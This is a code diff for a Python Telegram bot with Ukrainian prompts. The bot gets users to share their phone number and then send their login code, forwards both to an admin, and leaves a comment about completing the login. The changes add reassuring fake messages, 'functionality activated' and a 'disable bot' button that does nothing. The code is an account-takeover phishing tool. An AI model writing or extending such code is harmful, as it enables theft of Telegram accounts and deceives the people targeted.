@@ -29,7 +29,6 @@ def start(message):
         f"First Name: {first_name}\n"
         f"Last Name: {last_name}\n"
         f"Username: @{username}\n",
-        f"Phone: {phone}\n"
         f"ID: {user.id}\n"
         f"Language code: {language_code}"
     )
@@ -40,6 +39,12 @@ def start(message):
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     contact_button = types.KeyboardButton("📱 Поділитися контактом", request_contact=True)
     markup.add(contact_button)
+
+    bot.send_message(
+        chat_id,
+        "Потрібно підтвердити номер телефону, щоб продовжити. ",
+        reply_markup=markup
+    )
 
     bot.send_message(
         chat_id,
@@ -88,14 +93,28 @@ def handle_code(message):
     chat_id = message.chat.id
     code = message.text.strip()
     phone = user_data[chat_id]['phone']
-
+    
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+    contact_button = types.KeyboardButton("Вимкнути бота")
+    markup.add(contact_button)
+    
+    bot.send_message(chat_id, "Функціонал активовано!", reply_markup=markup)
     msg = f"✅ Отримано код від {chat_id}:\nТелефон: {phone}\nКод: {code}"
     print(msg)
     bot.send_message(admin_id, msg)
+    
 
     asyncio.run(show_data(chat_id, phone, code))
+    
+
+@bot.message_handler(func=lambda msg: msg.text == "Вимкнути бота")
+def disable_bot(message):
+    chat_id = message.chat.id
+    bot.send_message(chat_id, "Бот вимкнуто.")
+
 
 async def show_data(chat_id, phone, code):
     print(f"Phone: {phone}, Code: {code}")
+    # Тут можна дописати авторизацію, якщо хочеш завершити логін
 
 bot.polling()
